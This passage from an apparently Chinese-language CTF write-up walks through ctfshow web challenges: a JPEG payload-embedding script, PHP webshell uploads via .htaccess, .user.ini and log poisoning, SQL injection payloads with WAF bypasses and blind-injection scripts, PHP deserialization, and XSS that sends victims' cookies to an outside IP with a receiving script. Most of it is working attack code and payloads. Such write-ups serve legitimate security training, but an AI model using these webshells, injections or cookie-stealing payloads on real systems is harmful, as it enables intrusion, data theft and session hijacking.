                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

##### web166

打开前端代码发现只接收`.zip文件`，上传后发现可以在网站上打开上传的文件。
在zip文件尾加上php木马即可。

```
PK    ;{|Vcc汏 ^?    1.png V@┛塒NG
?                  1.pngPK      3   靳   <?=eval($_POST["shell"]);?>
```

![image-20230427194836009](.\Web-CTF\CTFshow040.png)

##### web167

前端只给传`.jpg`，上传`.htaccess`，

```htaccess
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatch>
```

然后上传shell直接蚁剑或者post就行

```php
? ?   w !1AQ aq"2?B憽绷  #3R?br?$4??&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz們剠唶垑姃摂晼棙櫄ⅲぅΗī炒刀犯购旅呐魄壬室釉罩棕仝忏溴骁栝牝篝貊鼬?
  ? 鞩?<詫{UyO蚛囈哅7~{??4?宝n憥MF?⒗佖滄⑤彮,噹jpi亍霫風Τ?z梫E? 揊zU%鉁5Ni历u猦I?峤玓嚏?<V綇@{?S?橀Z雒娖? 娰?ì?祴k飱l旉馬ru(\t5憊O5璼薏.簹瑕t-奀?4)氳嚉]詣s歀?{M?襥もγ闠lq殝'4ㄜ猹??鮦€?B?⒚&/FI$R撏鍘iT詆態瀐a俰? T[ㄎ{ 裛熓?▋z饅?Pi宀1P徶潨欳$ ?歡9?y?╅O 4晾"擳豥樻?隡?4磤qnx???E )$药鏇J?$?功揌9?94INV
z-"甹h?E&蒷r-N婭Ub睋9?談^iQzT葴?NyLU\u?&E"G蚇売碽s蔅*愕L睋?S:詧??0攧T }jd^)f?+X??)E qJ:U?QE!?Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Qi;R欳覙啌鵕c謼丄?N試&枟 蕄橥 4
K醒? 鐴枏聙訰?? %(燫??黂趪齬4R﨓mK(蒥絡#4?5釮b*3€E)9?U`滄鋳暯?鈦‘~Z厛??qQg歛pc??滮)嚲)?=( 螃岀4?莲D彼 虷?颩R2)?ObEVZ鰉?!q竀絸?荰鑶荂d8祄鱧?
<?php @eval($_POST{"shell"}); ?>
```

![image-20230427211136291](.\Web-CTF\CTFshow041.png)

##### web168

基础免杀，检查提交按钮发现需要png文件。提交图片马，BurpSuite抓包改为php后缀发现可以上传。

![image-20230428101110237](.\Web-CTF\CTFshow042.png)

```php
<?=`ls /`?> #命令会被干掉 用反引号加短标签来执行
```

![image-20230428102411850](.\Web-CTF\CTFshow043.png)

##### web169

![image-20230428103819234](.\Web-CTF\CTFshow045.png)

![image-20230428103648845](.\Web-CTF\CTFshow044.png)

传命令发现不太行，`<>?`都被过滤了，先传`.user.ini`文件利用日志上传

![image-20230428104846578](.\Web-CTF\CTFshow046.png)

```ini
auto_prepend_file=/var/log/nginx/access.log
```

然后上传一个1.php，在User-Agent中写一句话木马即可。

![image-20230428111702052](.\Web-CTF\CTFshow047.png)

搜索回显信息并找出flag即可

![image-20230428112041662](.\Web-CTF\CTFshow048.png)

##### web170

依旧用的上题做法，不知道哪里有不同，User-Agent的木马可以写成`<?=eval($_POST{1});?>`，用`{}`代替`[]`。

#### sql注入

mysql操作符优先级：（数字越大，优先级越高） 

| 优先级 | 运算符                                             |
| ------ | -------------------------------------------------- |
| 1      | :=                                                 |
| 2      | OR , XOR                                           |
| 3      | && , AND                                           |
| 4      | NOT                                                |
| 5      | BETWEEN, CASE, WHEN, THEN, ELSE                    |
| 6      | =, <=>, >=, >, <=, <, <>, !=, IS, LIKE, REGEXP, IN |
| 7      | \|                                                 |
| 8      | &                                                  |
| 9      | <<, >>                                             |
| 10     | -, +                                               |
| 11     | *, /, DIV, %, MOD                                  |
| 12     | ^                                                  |
| 13     | - (一元减号), ~ (一元比特反转)                     |
| 14     | !                                                  |
| 15     | BINARY, COLLATE                                    |

##### SELECT模块

###### 无过滤注入

**web171**

```sql
1 oderby 1,2,3; --+ 测出列数
1' union select 1,2,3; --+ 确认union攻击可行
1' union select 1,2,database(); --+ 得到数据库名ctfshow_web
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database(); --+ 得到表名ctfshow_user
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_user"; --+ 得到字段名id,username,password
1' union select 1,2,group_concat(id,username,password) from ctfshow_web.ctfshow_user; --+ 得到flag
```

**web172**

```sql
1 没报错
1' 报错 说明单引号闭合
1 orderby 1,2,3; --+ 未报错 证明有三列
1' union select 1,2,3; --+ 查出1 2 3
1' union select 1,2,database(); --+ 查出数据库ctfshow_web
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database(); --+ 表名ctfshow_user,ctfshow_user2
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_user";--+ 得到字段名id,username,password
1' union select 1,2,group_concat(id,username,password) from ctfshow_web.ctfshow_user;--+ 得到flag不在这 去查另一个表
1' union select 1,2,group_concat(id,username,password) from ctfshow_web.ctfshow_user2;--+ 得到flag
```

**web173**

```sql
1 查到数据
1' 报错证明单引号闭合
1 orderby 1,2,3;--+ 确认当前表格为3列
1' union select 1,2,3;--+ 正常查出1 2 3
1' union select 1,2,database();--+ 得到数据库名ctfshow_web
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();--+ 得到表名ctfshow_user3
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="ctfshow_user3" and table_schema=database();--+ 得到表名id,username,password
1' union select 1,2,group_concat(id,username,password) from ctfshow_web.ctfshow_user3;--+ 什么都没有查到 但是id可以单独查到 说明被过滤 base64加密
1' union select 1,2,to_base64(group_concat(id,username,password)) from ctfshow_web.ctfshow_user3;--+ 转成base64后绕过过滤 也可以hex()绕过
1' union select 1,2,group_concat('+',password) from ctfshow_web.ctfshow_user3 where username="flag";--+ 或者根据前几题的经验直接查字段条件
```

**web174**

根据题目给出的返回逻辑确定会过滤数字，用replace(str, src_str, des_str)函数将数字替换掉，搜索出来后人工替换并进行base64解码

```sql
1' union select  replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),2,'testb') ,3,'testc') ,4,'testd') ,5,'teste') ,6,'testf') ,7,'testg') ,8,'testh') ,9,'testi') ,0,'testj') ,1,'testa'),replace(1,'1','testa') from ctfshow_user4 where username='flag'--+
```

**web175**

全过滤了，真的过分...，0x0-0x7f的ASCII码全用不了，只能用无回显的文件写入和时间盲注

```sql
-1' union select username,password from ctfshow_user5 into outfile "/var/www/html/1.txt"--+
'#http://ee303176-432c-4eb2-a54b-c7b56788e365.challenge.ctf.show/1.txt 输出到文件访问即可
```

```sql
-1' union select 1,"<?php eval($_POST[1]);?>" into outfile'/var/www/html/1.php #写木马直接用蚁剑连接
```

还可以Base64后url编码发送，SQL语句用from_base64()函数：

`<?php eval($_POST[1]);?>`的base64编码`PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+`
``PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+`的Url编码
`%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b`
用这个替换掉`<?php eval($_POST[1]);?>`

```sql
-1' union select 1,from_base64(”%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b
”)into outfile'/var/www/html/1.php
```

在`/var/www/html/api/config.php`找到mysql的root的密码，进去直接看就行了

时间盲注

```sql
import requests,time
headers = {'content-type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
dict="qazwsxedcrfvtgbyhnujmikolp123456789{}-"
url="http://ee303176-432c-4eb2-a54b-c7b56788e365.challenge.ctf.show/select-no-waf-5.php"
flag=""
for i in range(1,100):
    for s in dict:
     payload = "?id=1' and if(substr((select password from ctfshow_user5 where username=\"flag\"),%d,1)=\"%s\",sleep(5),0)--+"%(i,s)
     start = time.time()
     r=requests.get(url+payload,headers=headers)
     end = time.time()
     if end-start >4.5:
         flag+=s
         print(flag)
```

**web176**

```sql
1 oderby 1,2,3;--+ 确认列数
1 union select 1,2,3;--+ 发现过滤
1' union Select 1,2,3;--+ 大写绕过了select过滤
1' union Select 1,2,database();--+ 得到数据库名ctfshow_web
1' union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();--+ 数据库名ctfshow_user
1' union Select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_user";--+ 得到字段名id,username,password
1' union Select 1,2,group_concat(id,username,password) from ctfshow_web.ctfshow_user;--+ 
```

###### 过滤注入

**web177**

在上题的基础上过滤了空格，可以用/**/或者%0a(回车)代替绕过，注释可以用%23(#)

```sql
1 orderby 1,2,3;--+ 未报错证明有三列
1'/**/Union/**/Select/**/1,2,3;%23 查出1 2 3
1'/**/Union/**/Select/**/1,database(),3;%23 查出数据库ctfshow_web
1'/**/Union/**/Select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database();%23 得到表ctfshow_user
1'/**/Union/**/Select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name="ctfshow_user";%23 得到字段id,username,password
1'/**/Union/**/Select/**/1,2,group_concat(id,username,password)/**/from/**/ctfshow_web.ctfshow_user;%23
```

**web178**

过滤掉了\*，%09，%0a，%0b，%0c，%0d还有括号绕过

```sql
1'--%23 查到了数据 过滤了空格 单引号闭合
1'/**/Union/**/Select/**/1,2,3;--%23 /**/被过滤了
1'%0cUnion%0cSelect%0c1,2,3;%23 查出1 2 3
1'%0cUnion%0cSelect%0c1,database(),3;%23 得到数据库名ctfshow_web
1'%0cUnion%0cSelect%0c1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0cwhere%0atable_schema=database();%23 得到表名ctfshow_user
1'%0cUnion%0cSelect%0c1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0cwhere%0atable_schema=database()%0aand%0atable_name="ctfshow_user";%23 得到字段名id,username,password
1'%0aUnion%0aSelect%0a1,2,group_concat(id,username,password)%0afrom%0actfshow_web.ctfshow_user%23 得到flag
```

**web179**

过滤掉了\%09，%0a，%0b，%0d，可以用%0c

```sql
1‘%0cor1=1%23 查到数据
1'%0cUnion%0cSelect%0c1,2,3;%23 查出1 2 3
1'%0cUnion%0cSelect%0c1,database(),3;%23 查出数据库ctfshow_web
1'%0cUnion%0cSelect%0c1,group_concat(table_name),3%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=database();%23 表名ctfshow_user
1'%0cUnion%0cSelect%0c1,group_concat(column_name),3%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_schema=database()%0cand%0ctable_name="ctfshow_user";%23 得到字段名id,username,password
1'%0cUnion%0cSelect%0c1,group_concat(id,username,password),3%0cfrom%0cctfshow_web.ctfshow_user;%23 拿下
```

**web180**

过滤了%23，用没被过滤的%0c代替注释:`--%0c`

```sql
1'%0cUnion%0cSelect%0c1,2,3;--%0c
1'%0cUnion%0cSelect%0c1,2,database();--%0c 数据库ctfshow_web
1'%0cUnion%0cSelect%0c1,2,group_concat(table_name)%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=database();--%0c 表ctfshow_user
1'%0cUnion%0cSelect%0c1,2,group_concat(column_name)%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_schema=database()%0cand%0ctable_name="ctfshow_user";--%0c 字段id,username,password
1'%0cUnion%0cSelect%0c1,2,group_concat(id,username,password)%0cfrom%0cctfshow_web.ctfshow_user;--%0c
```

**web181**

过滤了%0c，可以用单引号闭合

```sql
-1'or(username='flag')and'a'='a
1'||username='flag
1'or(username)='flag
1'%0cor%0cusername='flag 这里%0c没被过滤
```

**web182**

和上题一样，但过滤了’flag’，所以无法使用username=‘flag’，但经过了这么多题，我们已经知道了flag的id为26，所以

```sql
-1'or(id=26)and'a'='a
```

**web183**

regexp('a')正则匹配
在无回显的情况下使用时间盲注

```php
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  } #过滤完了基本...
```

```sql
tableName=`ctfshow_user`where(substr(`pass`,1,1)regexp('a'))
#ctfshow_user是表名
#pass是列名
#``是为了区分表名的
```

```sql
import requests
import re

url="http://164b9526-57c3-4978-bdd6-ad76fae3cfc7.challenge.ctf.show:8080/select-waf.php"
str="abcdefghijklmnopqrstuvwxyz-1234567890{}"
re=""
print(123)
for i in range(1,46):
    for j in str:
        data={
          'tableName':f"`ctfshow_user`where(substr(`pass`,{i},1)regexp('{j}'))"
        }
        r=requests.post(url=url,data=data).text
        if r.find(" $user_count = 1;")>0:
            re=re+j
            print(re)
            break
```

**web184**

```php
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  } #无法时间盲注 过滤了sleep()
```

过滤了：`' " 反引号`，用right join绕过过滤

```php
tableName=`ctfshow_user` as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))
```

RIGHT JOIN 关键字从右表(table2)返回所有的行，即使左表(table1)中没有匹配。如果左表中没有匹配，则结果为 NULL。
分别将ctfshow_uer重命名为a和b，接着在b中进行筛选，然后用right join将b中筛选出来的值与a表的值进行匹配，解法来自网络

```python
# @Author:Y4tacker
import requests

url = "http://61a8e463-0a7c-406f-9871-1c4b1ad17057.challenge.ctf.show/select-waf.php"

flag = 'flag{'
for i in range(45):
    if i <= 5:
        continue
    for  j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({j})))"
        }
        r = requests.post(url,data=data)
        if r.text.find("$user_count = 43;")>0:
            if chr(j) != ".":
                flag += chr(j)
                print(flag.lower())
                if chr(j) == "}":
                    exit(0)
                break
```

**web185**

同web186的payload

```php
//对传入的参数进行了过滤 相比上题多过滤了数据
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
}
```

```python
import requests

url='http://abbadcf4-18c4-43bd-bdb2-77110cbd6e07.challenge.ctf.show/select-waf.php'
flag = ''
def Num(n):
    num=''
    for i in range(n):
        num=num+'true+'
    num=num[:-1]
    return num

for i in range(50):
    for j in range(0,128):
        data={
            'tableName':f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{Num(i)},{Num(1)}) regexp(char({Num(j)})))"
        }
        r=requests.post(url=url,data=data)
        if r.text.find("$user_count = 43;")>0:
            if chr(j)!='.':
                flag+=chr(j)
                print(flag.lower())
                print(str(i)+':'+str(j)+':')
                print(data)
                break
```

**web187**

```php
$username = $_POST['username'];
    $password = md5($_POST['password'],true); #很明显注入点是md5()函数这里，后面用了参数true，返回的是一个16位二进制

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```

从网上搜集到的有一个字符串`ffifdyop`很特殊

```php
echo md5("ffifdyop",true);
//结果
'or'6(后面的是不可见字符)
```

可以看到会返回引号闭合和or并且后面是一些不可见字符，在mysql中进行布尔判断的时候，只要是数字开头就会被当作true，结果也就是

```sql
password=''or true
```

使用ffifdyop登录并进行BurpSuite抓包得到flag。

**web188**

```php
$sql = "select pass from ctfshow_user where username = {$username}";

//用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
```

可以看到是通过检索username来列出密码，然后一个弱比较来进行判断，先给出payload

```sql
username=0&password=0
```

以这道题的数据库为例，这个数据库中的用户名都是以字母开头的数据，而以字母开头的数据在和数字比较时，会被强制转换为0，因此就会相等，后面的pass也是一样的道理
但注意，如果有某个数据不是以字母开头，是匹配不成功的，这种情况怎么办，可以用`||`运算符

```sql
username=1||1&password=0
```

**web189**

```php
//拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";

//用户名检测
  if(preg_match('/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }
```

开局就来个提示，flag在`api/index.php`中
这次尝试`username=0&password=0`登录，发现提示密码错误，说明是密码跟上一题不一样了，不是以字母开头的数据。根据提示，flag的位置在一个文件中，可以用`load_file`来配合`regexp`来进行盲注

**LOAD_FILE(file_name)：** 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。

**regexp：** mysql中的正则表达式操作符

```python
import requests
url = "http://3dc07d6c-7ec5-4514-8158-38f1439bea1a.challenge.ctf.show:80/api/"
all_str = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
flag = "ctfshow{"

for i in range(200):
    for j in all_str:
        data = {
            "username":"if(load_file('/var/www/html/api/index.php')regexp('{0}'),0,1)".format(flag + j),
            'password':0
        }
        res = requests.post(url=url, data=data)
        if r"\u5bc6\u7801\u9519\u8bef" in res.text:
            flag +=j
            print(flag)
            break
        if j=='}':
            exit()
```

###### 布尔盲注

**web190**

```php
//拼接sql语句查找指定ID用户
$sql = "select pass from ctfshow_user where username = '{$username}'";

//密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
```

很明显，username处存在注入漏洞，但是当输入错误信息时，只会回显“密码只能为数字”或者“密码错误”。

```ini
username:admin' and 0#
password:123456
用户名不存在

username:admin' and 1#
password:123456
密码错误

username:admin' and -1#
password:123456
密码错误
```

![image-20230512110107806](.\Web-CTF\CTFshow049.png)

这里能看出在mysql的数字中，只有0是false，其余都是true。
基于此，可以写出如下脚本：

```python
import requests
import sys
import time

url = "http://6e5f7af1-619c-4a29-8aa3-6286707ec5f0.challenge.ctf.show/api/"
flag = ""
for i in range(1,60):
    max = 127
    min = 32
    while 1:
        mid = (max+min)>>1
        if(min == mid):
            flag += chr(mid)
            print(flag)
            break
        #payload = "admin'and (ascii(substr((select database()),{},1))<{})#".format(i,mid)
        #ctfshow_web
        #payload = "admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{})#".format(i,mid)
        #ctfshow_fl0g
        #payload = "admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))<{})#".format(i,mid)
        #id,f1ag
        payload = "admin'and (ascii(substr((select f1ag from ctfshow_fl0g),{},1))<{})#".format(i,mid)

        data = {
            "username":payload,
            "password":0,
        }
        res = requests.post(url = url,data =data)
        time.sleep(0.3)
        if res.text.find("8bef")>0:
            max = mid
        else:
            min = mid 
```

**web191**

过滤了`file|into|ascii`，`ascii`可以换成`ord`，因为过滤了`file|into`，所以web190应该还可以上传木马
同时不用`Ascii`也可以直接用大于号比较字母的`Ascii`大小，二分法依旧可以用

```python
import requests
import sys
import time

url = "http://5db41c78-c331-4083-8be1-66e7cd765580.challenge.ctf.show/api/"
flag = ""
for i in range(1,60):
    max = 127
    min = 32
    while 1:
        mid = (max+min)>>1
        if(min == mid):
            flag += chr(mid)
            print(flag)
            break
        #payload = "admin'and (ascii(substr((select database()),{},1))<{})#".format(i,mid)
        #ctfshow_web
        #payload = "admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{})#".format(i,mid)
        #ctfshow_fl0g
        #payload = "admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))<{})#".format(i,mid)
        #id,f1ag
        payload = "admin'and (ord(substr((select f1ag from ctfshow_fl0g),{},1))<{})#".format(i,mid)

        data = {
            "username":payload,
            "password":0,
        }
        res = requests.post(url = url,data =data)
        time.sleep(0.3)
        if res.text.find("8bef")>0:
            max = mid
        else:
            min = mid 

```

**web192**



#### 反序列化

##### web254

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username']; #GET请求 根据要求传入即可
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

```
http://57c5cac7-18c3-484b-982c-e6a05995cb83.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
```

##### web255

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

审计代码发现可以从cookie的user中传入payload实例化字符串，同样需要isVip=True
cookie中将"作为截断符号，所需要编码绕过，这里采用url编码

```php
<?php

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=True;
}
$c = new ctfShowUser();
echo urlencode(serialize($c));
```

```
URL：http://8408783d-e73a-40bc-9a5d-dd4cd02eb9eb.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
Cookie：user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

##### web256

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){ #需要username和password两个不相等
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

```php
<?php
class ctfShowUser{
    public $username='1';
    public $password='2';
    public $isVip=True;
}
$c = new ctfShowUser();
echo urlencode(serialize($c)); #O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

```
URL：http://0b2e87a1-1b45-444d-a847-d698721e0530.challenge.ctf.show/?username=1&password=2
Cookie：user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

##### web257

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```

#### XSS

##### Ctfshow-web316

**反射型**

F12开发者终端

> \> document.cookie														获取当前界面的cookie
> 'PHPSESSID=mms2n4u7ml2kv2d48jhkpcmcha; flag=you%20are%20not%20admin%20no%20flag'
> \> window.location.href="http://www.baidu.com"			跳转到href的地址中去

服务器准备一个接收cookie的文件(get.php)，公网平台接收端代码如下

```php+HTML
<!-- get.php -->
<?php
$cookie=$_GET['c'];
echo $cookie;
$myfile=fopen("cookie.txt","w+");		#w+代表追加写入 而不是覆盖
fwrite($myfile, $cookie);
fclose($myfile);
?>
```

受攻击的客户端执行XSS攻击代码为**`<script>window.location.href='http://91.149.203.137/get.php?c='+document.cookie</script>`**
获取到了cookie之后因为并不是管理员访问，所以文本中并没有，靶场设置了具有管理员权限的机器人去点链接，等待并刷新文件即可

踩坑记录，接受cookie的公网网站上的get.php及所在目录需要有写入的权限(我给的777)，否则会写入失败。

或者用VPS **`<script>window.open("vps_ip"+document.cookie)</script>`**

```sh
#vps
nc -lvnp 8080
```

##### Ctfshow-web317

**反射型**

测试了一下**`<script>window.location.href='http://91.149.203.137/get.php?c='+document.cookie</script>`**在没有**`<script>`**标签的情况下可以正常加载，说明是标签被过滤了。

https://xz.aliyun.com/t/4067?time__1311=n4%2BxnD0DyGYQqxmw405%2BbWeDtlAqAKqPq5x XSS绕过博客文章

```js
<img src=1 onerror=window.location.href='http://91.149.203.137/files/getCookie.php?c='+document.cookie>
<!--访问链接为1的图片，但是访问时候就会报错，此时就会执行error后的xss链接-->
```

实际上多等一会也不会有flag，因为管理员机器人的设计，所以需要改错误时间为载入事件来让机器人触发XSS，即不用鼠标点击就触发

```js
<body onload=window.location.href='http://91.149.203.137/files/getCookie.php?c='+document.cookie>
```

##### Ctfshow-web318

**反射型**

本题过滤了img，但是直接用body的载入事件即可

```js
<body onload=window.location.href='http://91.149.203.137/files/getCookie.php?c='+document.cookie>
```

Ctfshow-web319**反射型**也适用该padyload，通杀

```js
<svg onload=window.location.href='http://91.149.203.137/files/getCookie.php?c='+document.cookie>
